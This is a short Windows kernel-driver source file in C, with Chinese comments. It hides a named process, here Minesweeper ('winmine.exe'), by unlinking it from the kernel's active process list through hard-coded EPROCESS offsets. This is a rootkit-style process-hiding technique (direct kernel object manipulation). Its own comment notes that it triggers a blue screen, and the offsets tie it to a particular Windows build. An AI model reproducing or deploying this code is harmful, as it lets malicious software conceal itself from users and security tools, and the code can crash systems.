//会蓝屏109
#pragma once
#include<ntddk.h>


void HideProcess(char* ProcName)
{
	//获取当前进程对象
	PEPROCESS NowProc = PsGetCurrentProcess();
	//获取进程对象内的当前活动进程链表
	LIST_ENTRY* pNowList = (LIST_ENTRY*)((ULONG64)NowProc + 0x2e8);
	//临时链表
	LIST_ENTRY* pTempList = pNowList;
	//遍历链表
	while (pNowList != pTempList->Flink)
	{
		//相对进程对象偏移0x450保存的是ImageFileName,
		//当前相对进程对象偏移是0x2e8，需要减去
		//对比是否为目标进程			
		if (!strcmp(ProcName, (char*)((ULONG64)pTempList - 0x2e8 + 0x450)))
		{
			//把找到的进程从链表中删除
			(pTempList->Blink)->Flink = pTempList->Flink;
			(pTempList->Flink)->Blink = pTempList->Blink;

			pTempList->Flink = pTempList->Blink = NULL;
			KdPrint(("成功删除程序链表节点\n"));

			break;
		}
		pTempList = pTempList->Flink;
	}

}


VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
	
    DbgPrint("DriverUnload()\r\n");
}


NTSTATUS DriverEntry(IN PDRIVER_OBJECT  DriverObject,IN PUNICODE_STRING  RegistryPath)
{
	HideProcess("winmine.exe");
    DriverObject->DriverUnload = DriverUnload;
    return STATUS_SUCCESS;
}
